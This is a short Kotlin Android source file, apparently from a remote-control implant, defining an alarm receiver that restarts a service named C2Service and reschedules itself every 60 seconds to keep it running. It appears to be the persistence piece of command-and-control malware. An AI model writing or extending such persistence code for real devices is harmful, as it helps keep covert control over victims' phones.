package ai.obsidian.agent.persist

import ai.obsidian.agent.svc.C2Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class AlarmReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        C2Service.start(context)
        Ladder.scheduleAlarm(context, 60_000L)
    }
}
